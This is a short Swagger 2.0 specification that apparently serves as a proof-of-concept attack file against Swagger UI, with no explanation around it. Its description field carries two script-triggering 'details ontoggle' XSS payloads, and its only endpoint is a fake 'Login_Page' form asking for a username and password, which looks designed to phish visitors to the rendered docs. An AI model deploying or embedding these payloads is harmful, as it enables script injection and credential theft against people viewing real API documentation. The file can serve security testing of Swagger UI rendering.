swagger: '2.0'
info:
  version: 1.0.0
  title: 'Swagger UI'
  description: 'details: <details open ontoggle=alert(1)>x</details> <details ontoggle=alert(document.domain) open>auto</details>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
